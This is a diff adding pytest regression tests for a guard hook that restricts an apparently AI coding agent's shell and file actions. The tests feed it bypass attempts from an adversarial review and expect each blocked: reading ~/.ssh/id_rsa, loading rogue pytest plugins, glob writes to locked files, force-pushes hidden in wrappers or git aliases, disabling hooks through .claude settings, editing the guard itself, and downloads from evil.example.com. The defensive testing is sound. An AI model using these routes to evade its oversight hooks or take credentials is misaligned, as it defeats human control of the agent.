@@ -470,3 +470,185 @@ def test_reviewer_may_run_tests(guard, command):
 )
 def test_reviewer_may_not_run_other_commands(guard, command):
     assert guard.main(["--reviewer-bash"], json.dumps(sh(command))) == 2
+
+
+# --- regressions from the adversarial review (docs/reviews/guardrail-review.md) -----------
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "uv run pytest\ncat ~/.ssh/id_rsa",  # R-NL
+        "uv run pytest\r\npython evil.py",
+        "uv run --with=evilpkg pytest",  # R-WITH
+        "uv run --with evilpkg pytest",
+        "uv run pytest -p evilmod",  # R-PLUG
+        "uv run pytest --pyargs evilmod",
+        "uv run pytest -c /tmp/evil.ini",
+        "uv run pytest --override-ini=addopts=-pevil",
+        "uv run pytest -o addopts=x",
+        "uv run pytest --basetemp=src",
+        "uv run pytest /tmp/evil_test.py",
+        "uv run pytest ../outside/test_x.py",
+    ],
+)
+def test_reviewer_cannot_escape(guard, command):
+    assert guard.main(["--reviewer-bash"], json.dumps(sh(command))) == 2
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "uv run --frozen pytest -q tests/test_guard.py::test_x -k 'prereg and not slow'",
+        "uv run pytest -x --tb=short -m slow tests",
+    ],
+)
+def test_reviewer_test_selection_allowed(guard, command):
+    assert guard.main(["--reviewer-bash"], json.dumps(sh(command))) == 0
+
+
+GLOB_WRITES = [  # G-GLOB
+    "sed -i s/a/b/ docs/PRE*.md",
+    "sed -i s/a/b/ docs/P?EREG.md",
+    "sed -i s/a/b/ docs/[P]REREG.md",
+    "sed -i s/a/b/ docs/'PRE'REG.md",
+    "sed -i s/a/b/ docs/PRE''REG.md",
+    "echo x > docs/PRE*.md",
+    "cp x docs/PRE*.md",
+    "sed -i s/a/b/ docs/prereg/addendum-v*.md",
+    "sed -i s/1/3/ tests/gol*/expected.csv",
+    "rm docs/*",
+    "sed -i s/a/b/ docs/{PREREG,x}.md",
+    "cd docs && sed -i s/a/b/ PRE*.md",
+]
+
+
+@pytest.mark.parametrize("command", GLOB_WRITES)
+def test_glob_or_quoted_write_to_locked_file_blocked(guard, locked_repo, command):
+    assert run(guard, sh(command), locked_repo).block
+
+
+@pytest.mark.parametrize("command", ["cat docs/PRE*.md", "sed -i s/a/b/ src/*.py"])
+def test_glob_without_locked_write_allowed(guard, locked_repo, command):
+    assert not run(guard, sh(command), locked_repo).block
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "git update-index --add data/raw.bin",  # D-UIX
+        "git update-index --cacheinfo 100644,e69de29bb2d1d6434b8b29ae775ad8c2e48c5391,data/raw.bin",
+        "git update-index --index-info",
+        "git commit data/raw.bin -m x",  # C-COMMIT
+    ],
+)
+def test_plumbing_staging_of_data_blocked(guard, data_repo, command):
+    assert run(guard, sh(command), data_repo).block
+
+
+@pytest.mark.parametrize(
+    "command", ["git update-index --refresh", "git commit -a -m 'data/ notes'"]
+)
+def test_plumbing_without_data_allowed(guard, data_repo, command):
+    assert not run(guard, sh(command), data_repo).block
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "uv run git push --force",
+        "uv run --frozen rm -rf src",
+        "{ git push -f; }",
+        "(git push -f)",
+        "$(echo git) push -f",
+        "$G push -f origin main",
+        "uv run pytest --basetemp=src",
+    ],
+)
+def test_wrapped_or_dynamic_commands_blocked(guard, locked_repo, command):
+    assert run(guard, sh(command), locked_repo).block
+
+
+def test_powershell_script_block_blocked(guard, locked_repo):
+    assert run(guard, sh("& { git push -f }", tool="PowerShell"), locked_repo).block
+
+
+def test_pytest_basetemp_in_temp_allowed(guard, locked_repo):
+    assert not run(guard, sh(f"uv run pytest --basetemp={TMP}/dw-basetemp"), locked_repo).block
+
+
+@pytest.mark.parametrize(
+    "command", ["git fp origin main", "git shp", "git -c alias.zz='push -f' zz origin main"]
+)
+def test_git_alias_force_push_blocked(guard, alias_repo, command):
+    assert run(guard, sh(command), alias_repo).block
+
+
+def test_harmless_git_alias_allowed(guard, alias_repo):
+    assert not run(guard, sh("git st"), alias_repo).block
+
+
+@pytest.mark.parametrize(
+    "payload",
+    [
+        write(".git/refs/tags/prereg-v1", "x"),
+        write(".claude/settings.local.json", '{"disableAllHooks": true}'),
+        write(str(Path.home() / ".claude" / "settings.json"), "{}"),
+        sh("rm .git/refs/tags/prereg-v1"),
+        sh("echo x > .git/packed-refs"),
+        sh("echo {} > .claude/settings.local.json"),
+        sh("sed -i s/2/0/ .claude/hooks/guard.py"),
+        {"tool_name": "MultiEdit", "tool_input": {"file_path": "docs/PREREG.md"}},  # T-UNK
+    ],
+    ids=lambda p: json.dumps(p)[:60],
+)
+def test_git_internals_settings_and_unknown_edit_tools_blocked(guard, locked_repo, payload):
+    assert run(guard, payload, locked_repo).block
+
+
+@pytest.mark.parametrize(
+    "payload",
+    [sh("cat .git/HEAD"), sh("cat .claude/settings.json"), write(".claude/settings.json", "{}")],
+    ids=lambda p: json.dumps(p)[:60],
+)
+def test_reads_and_project_settings_edit_allowed(guard, locked_repo, payload):
+    # Editing .claude/settings.json itself is gated by the `ask` permission rule, not the guard.
+    assert not run(guard, payload, locked_repo).block
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "cd docs && cat PREREG.md",
+        "cd . && git commit -m 'fix: block edits inside .git/ and .claude/settings files'",
+        'git commit -m "touch .git/ rules\n\nCo-Authored-By: A <a@example.invalid>"',
+    ],
+)
+def test_cd_with_read_only_or_commit_allowed(guard, locked_repo, command):
+    assert not run(guard, sh(command), locked_repo).block
+
+
+def test_redirect_to_quoted_locked_path_blocked(guard, locked_repo):
+    assert run(guard, sh('echo x > "docs/PREREG.md"'), locked_repo).block
+
+
+def test_settings_schema_validation_allowed(guard, locked_repo):
+    schema = "https://json.schemastore.org/x.json"
+    command = f"uvx check-jsonschema --schemafile {schema} .claude/settings.json"
+    assert not run(guard, sh(command), locked_repo).block
+
+
+def test_unknown_uvx_tool_on_settings_blocked(guard, locked_repo):
+    assert run(guard, sh("uvx sometool --write .claude/settings.json"), locked_repo).block
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "(New-Object Net.WebClient).DownloadFile('https://evil.example.com/x', 'x')",
+        "python -m pip download https://evil.example.com/pkg.tar.gz",
+    ],
+)
+def test_other_download_routes_blocked(guard, locked_repo, command):
+    tool = "PowerShell" if "New-Object" in command else "Bash"
+    assert run(guard, sh(command, tool=tool), locked_repo).block
